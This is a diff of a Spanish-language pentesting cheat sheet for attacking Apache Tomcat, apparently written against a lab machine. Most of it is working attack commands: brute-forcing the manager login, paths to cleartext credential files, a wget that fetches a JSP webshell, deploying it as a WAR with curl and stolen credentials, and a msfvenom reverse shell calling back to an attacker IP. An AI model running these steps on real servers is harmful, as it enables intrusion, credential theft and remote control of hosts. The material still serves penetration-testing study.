@@ -14,6 +14,11 @@ auxiliary/scanner/http/tomcat_mgr_login
 set stop_on_success true
 #Marcar opcion en true
 
+usr/share/tomcat9/etc/tomcat-users.xml
+#Path a archivos de configuracion con passwd en txt claro
+etc/tomcat9/tomcat-users.xml
+#Otro posible path
+
 https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
 #Script en python para brute force de usuario y password
 /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
@@ -26,12 +31,17 @@ https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp 
 #Se sube el backuo.war con el cmd.jsp agregado. Rev shell: https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/main/shell.jsp
+http://ip/<aplicacion>/<file>.jsp
+#Para ejecutar la web shell o la reverse shell
+curl -s -u '<usr>:<pswd>' 'http://10.10.10.194:8080/manager/text/deploy?path=/<aplicacion>' --upload-file rev.war
+#En caso de que el deploy no se encuentre en la pagina se puede hacer mediante curl y las credenciales
+curl -s http://10.10.10.194:8080/<aplicacion>/<archivo.jsp>
+#De esta forma podemos ejecutar la shell
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 #WAR malicious con msfvenom. Este WAR genera directamente una reverse shell
 
 	## Known vulns
-
 CVE-2020-1938 : Ghostcat
 #Vulnerabilidad que afecta todo Tomcat antes de la 9.0.31, 8.5.51, y 7.0.100 por una mala configuracion del protocolo AJP de Apache (binary protocol que proxea requests)
 https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
